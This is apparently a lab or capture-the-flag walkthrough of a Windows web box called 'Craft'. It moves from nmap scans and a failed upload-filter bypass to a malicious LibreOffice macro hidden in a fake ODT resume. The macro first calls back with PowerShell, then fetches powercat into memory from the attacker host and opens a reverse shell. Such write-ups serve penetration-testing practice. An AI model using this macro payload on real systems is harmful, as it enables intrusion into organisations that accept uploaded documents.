Nmap scan
```sh
nmap -p- --min-rate 5000 -T4 -Pn 192.168.203.169

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-16 21:28 IST
Nmap scan report for 192.168.203.169
Host is up (0.088s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
```

```sh
 nmap -sC -sV -T4 -Pn -p 80 192.168.203.169      

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-16 21:29 IST
Nmap scan report for 192.168.203.169
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
```

Visiting web server on port 80.
![](Images/Craft1.png)

Directory brute forcing.
![](Images/Craft9.png)
At the bottom there are physical and email addresses.
![](Images/Craft4.png)
Most importantly we find upload capability. The company is accepting resumes. This must be our way in.
![](Images/Craft5.png)

Visiting directory /uploads.
![](Images/Craft2.png)

I’m always excited to see an uploads directory. I’ll keep that in mind as I test the upload functionality. First I create a dummy file.
![](Images/Craft3.png)
Uploaded the test.txt and we got the error. The error message tells is it needs to be an ODT file. I have not heard of that so I check.
![](Images/Craft4.png)
There’s a `/uploads` directory that we can access. Well, we can try to bypass the upload filter and upload a PHP reverse shell using burp suite.

Changing the content type doesn’t work.
![](Images/Craft7.png)
Adding “.odt” to the end works. Let’s try using NULL bytes to remove the “.odt”.
![](Images/Craft8.png)
Didn’t work.

Hmm… Let’s search for an ODT reverse shell instead. There’s a Metasploit module for this, but I prefer not to use Metasploit.
https://www.exploit-db.com/exploits/46727?source=post_page-----4b86a013924d---------------------------------------
It’s CVE-2018–16858. We just need to create a malicious macro in the .odt documents.
 Instead I’m going to try to work with ODT. I have worked with Microsoft Office to create documents with malicious macros. I’m confident we can do that here as well.

LibreOffice is easy to install if you do not have it. This software is all-around useful so you likely have this already but if not.
```sh
sudo apt install libreoffice
```
Next we are going to create a fake resume. Open a new document.
![](Images/Craft10.png)
Go to Tools → Macros → Organize Macros → Basic
![](Images/Craft11.png)

Select your document, then New, and give it a name.
![](Images/Craft12.png)

This will open up a work space. We will embed the following command in our macro. This will simply call back to our machine. It’s a test.
```sh
Shell("cmd /c powershell iwr http://192.168.45.205/")
```
![](Images/Craft13.png)
Then go back to the document (Dork-resume), select Tools and Customize.
![](Images/Craft14.png)
Select Open Document then Assign Macro…
![](Images/Craft15.png)
Select the Macro (Evil) that we created for our document and OK.
![](Images/Craft16.png)
Note that the macro is now assigned to the action.
![](Images/Craft17.png)
Close it by selecting OK again and save the document (Dork-resume)
![](Images/Craft18.png)
![](Images/Craft19.png)
Now we set up a netcat listener on port 80. This will tell us if our macro works.
Go back to the web page and upload the newly created resume.
![](Images/Craft20.png)

![](Images/Craft21.png)
We check our listener and after about 10 seconds we get a connection.
![](Images/Craft22.png)
Now it’s time to really weaponize it. Be sure to Remove the the old macro before assigning the new one.
![](Images/Craft23.png)
Then alter the macro with a command that will give us a reverse shell. We are going to use the wonderful powershell version of netcat called powercat. The command will reach back to our server for powercat and then execute it. The first part of the command (IEX…) loads powercat into memory and the second part (after the semi-colon) executes the newly loaded program. This is especially powerful because **the powercat file never touches the disk.**
```ps
Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.205/powercat.ps1');powercat -c 192.168.45.205 -p 135 -e powershell")
```
The go back Tools → Customize and re-Assign the (Evil) macro.
![](Images/Craft24.png)
After everything is saved again, cancel your previous listener and set up a python web sever to host powercat
```sh
python -m http.server 80
```
Upload your revise resume. We see evidence the first command executed as shown by the retrieval of powercat from our machine
![](Images/Craft25.png)
Before uploading newly created .odt file download powercat.ps1 in the same folder where we starting python server. Both .ps1 and .odt file must be in same folder.
https://github.com/besimorhino/powercat/blob/master/powercat.ps1
![](Images/Craft26.png)

![](Images/Craft28.png)
Then we check our listener.
![](Images/Craft29.png)
Captured local flag.
![](Images/Craft30.png)
